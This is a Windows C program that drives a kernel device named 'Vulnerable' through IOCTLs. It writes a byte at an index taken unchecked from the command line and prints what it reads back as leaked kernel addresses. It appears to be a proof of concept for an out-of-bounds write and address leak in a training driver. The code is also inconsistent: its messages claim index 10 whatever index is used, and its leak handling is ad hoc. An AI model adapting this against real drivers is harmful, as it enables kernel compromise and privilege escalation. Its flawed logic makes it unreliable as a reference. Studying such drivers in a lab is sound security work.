#include <windows.h>
#include <stdio.h>

#define IOCTL_READ_BUFFER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_BUFFER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BUFFER_SIZE 256

struct WriteBufferInput {
    ULONG index;
    UCHAR value;
};

int main(int argc, char **argv)
{
    HANDLE hDevice;
    BOOL result;
    DWORD bytesReturned;
    UCHAR readValue;
    PVOID kernelAddress;
    struct WriteBufferInput writeInput;

    // Open a handle to the device
    hDevice =
        CreateFile(
            L"\\\\.\\Vulnerable",
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device - error %d\n", GetLastError());
        return 1;
    }

    // Write 'A' to index 10 in the kernel buffer
    writeInput.index = atoi(argv[1]);
    writeInput.value = 'A';

    UCHAR writeBuffer[sizeof(writeInput) + sizeof(PVOID)];

    memcpy(writeBuffer, &writeInput, sizeof(writeInput));

    result = DeviceIoControl(hDevice,
        IOCTL_WRITE_BUFFER,
        writeBuffer,
        sizeof(writeBuffer),
        writeBuffer,
        sizeof(writeBuffer),
        &bytesReturned,
        NULL);

    if (!result) {
        printf("Failed to write to device - error %d\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    kernelAddress = *(PVOID*)(writeBuffer + sizeof(writeInput));
    printf("Wrote 'A' to index 10. Kernel address: %p\n", kernelAddress);

    // Read from index 10 in the kernel buffer
    ULONG readIndex = 10;
    UCHAR readBuffer[sizeof(UCHAR) + sizeof(PVOID)];

    memcpy(readBuffer, &readIndex, sizeof(readIndex));

    result = DeviceIoControl(hDevice,
        IOCTL_READ_BUFFER,
        readBuffer,
        sizeof(readIndex),
        readBuffer,
        sizeof(readBuffer),
        &bytesReturned,
        NULL);

    if (!result) {
        printf("Failed to read from device - error %d\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    readValue = *(UCHAR*)readBuffer;
    kernelAddress = *(PVOID*)(readBuffer + sizeof(UCHAR));
    printf("Read value: '%c' from index 10. Kernel address: %p\n", readValue, kernelAddress);

    // Close the handle to the device
    CloseHandle(hDevice);

    return 0;
}
